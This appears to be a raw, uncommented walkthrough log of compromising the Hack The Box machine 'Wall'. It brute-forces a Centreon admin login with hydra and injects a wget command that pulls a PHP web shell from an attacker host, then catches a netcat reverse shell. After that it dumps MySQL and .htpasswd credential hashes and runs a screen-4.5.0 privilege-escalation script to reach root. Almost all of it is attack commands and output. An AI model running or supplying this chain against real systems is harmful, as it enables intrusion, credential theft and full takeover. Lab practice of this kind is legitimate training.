@@ -1,0 +1,206 @@
+
+Centreon 19.04.0 running on /centreon
+
+using the Centreon api to bruteforce
+
+https://documentation.centreon.com/docs/centreon/en/latest/api/api_rest/index.html
+
+root@kali:~/HTB/Wall# hydra -s 80 -l admin -P /root/HTB/Wall/list wall.htb http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:F=Bad" -t 10 -w 5 -W 1
+Hydra v8.9.1 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-15 00:46:08
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 70 login tries (l:1/p:70), ~7 tries per task
+[DATA] attacking http-post-form://wall.htb:80/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:F=Bad
+[80][http-post-form] host: wall.htb   login: admin   password: password1
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-15 00:46:46
+
+
+Eexc command
+http://wall.htb/centreon/main.php?p=60801&command_hostaddress=&command_example=&command_line=ls&o=p&min=1
+
+http://wall.htb/centreon/main.php?p=60801&command_hostaddress=&command_example=&command_line=wget%20http://10.10.15.9:8000/myshell.php%20.&o=p&min=1
+
+http://wall.htb/centreon/myshell.php
+
+root@kali:~/HTB/Wall# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.9] from wall.htb [10.10.10.157] 53904
+Linux Wall 4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 18:54:31 up 15 min,  0 users,  load average: 0.86, 1.70, 1.25
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ 
+$ env
+OLDPWD=/home
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=9:23015
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=f4e41aea259e465b9a155c544c91a3e3
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/home/shelby
+$ 
+www-data@Wall:/home/shelby$ uname -a
+uname -a
+Linux Wall 4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+
+www-data@Wall:/tmp$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/mount
+/bin/ping
+/bin/screen-4.5.0
+/bin/fusermount
+/bin/su
+/bin/umount
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/eject/dmcrypt-get-device
+
+[+] We can connect to the local MYSQL service as 'root' and without a password!
+mysqladmin  Ver 9.1 Distrib 10.1.40-MariaDB, for debian-linux-gnu on x86_64
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Server version		10.1.40-MariaDB-0ubuntu0.18.04.1
+Protocol version	10
+Connection		Localhost via UNIX socket
+UNIX socket		/var/run/mysqld/mysqld.sock
+Uptime:			32 min 53 sec
+
+Threads: 11  Questions: 184050  Slow queries: 0  Opens: 139  Flush tables: 1  Open tables: 133  Queries per second avg: 93.284
+
+
+www-data@Wall:/tmp$ mysql -u root -p
+mysql -u root -p
+Enter password: 
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 41437
+Server version: 10.1.40-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>     
+
+MariaDB [mysql]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| centreon           |
+| centreon__storage  |
+| centreon_storage   |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+6 rows in set (0.00 sec)
+
+MariaDB [mysql]> show tables;
+MariaDB [mysql]> select * from user;
+select * from user;
++-----------+---------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
+| Host      | User          | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string | password_expired | is_role | default_role | max_statement_time |
++-----------+---------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
+| localhost | root          |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | N                | N       |              |           0.000000 |
+| localhost | centreon_user | *99B6D81EE56556D4D3E52808D820652BF4DA64CE | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | N                | N       |              |           0.000000 |
+| localhost | centreon      | *99B6D81EE56556D4D3E52808D820652BF4DA64CE | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | N                | N       |              |           0.000000 |
++-----------+---------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
+3 rows in set (0.00 sec)
+
+MariaDB [mysql]> 
+
+$ cat /etc/.htpasswd
+admin:$apr1$7hIqRwgr$.QPU0yknBQRTf3WW9jfFp.
+
+
+www-data@Wall:/tmp$ wget http://10.10.15.9:8000/tryagain.sh .
+wget http://10.10.15.9:8000/tryagain.sh .
+--2019-09-17 21:21:57--  http://10.10.15.9:8000/tryagain.sh
+Connecting to 10.10.15.9:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1152 (1.1K) [text/x-sh]
+Saving to: 'tryagain.sh'
+
+tryagain.sh         100%[===================>]   1.12K  --.-KB/s    in 0.02s   
+
+2019-09-17 21:21:57 (62.3 KB/s) - 'tryagain.sh' saved [1152/1152]
+
+--2019-09-17 21:21:57--  http://./
+Resolving . (.)... failed: Temporary failure in name resolution.
+wget: unable to resolve host address '.'
+FINISHED --2019-09-17 21:21:57--
+Total wall clock time: 0.3s
+Downloaded: 1 files, 1.1K in 0.02s (62.3 KB/s)
+www-data@Wall:/tmp$ ls -a
+ls -a
+.  ..  tryagain.sh
+www-data@Wall:/tmp$ bash tryagain.sh
+bash tryagain.sh
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+/tmp/libhax.c: In function 'dropshell':
+/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod'; did you mean 'chroot'? [-Wimplicit-function-declaration]
+     chmod("/tmp/rootshell", 04755);
+     ^~~~~
+     chroot
+/tmp/rootshell.c: In function 'main':
+/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
+     setuid(0);
+     ^~~~~~
+     setbuf
+/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
+     setgid(0);
+     ^~~~~~
+     setbuf
+/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
+     seteuid(0);
+     ^~~~~~~
+     setbuf
+/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]
+     setegid(0);
+     ^~~~~~~
+/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]
+     execvp("/bin/sh", NULL, NULL);
+     ^~~~~~
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+# whoami
+whoami
+root
+# cat /root/root.txt
+cat /root/root.txt
+1fdbcf8c33eaa2599afdc52e1b4d5db7
+# pwd
+pwd
+/etc
+# cd home
+cd home
+sh: 4: cd: can't cd to home
+# cat /home/shelby/user.txt
+cat /home/shelby/user.txt
+fe6194544f452f62dc905b12f8da8406
+# 
+
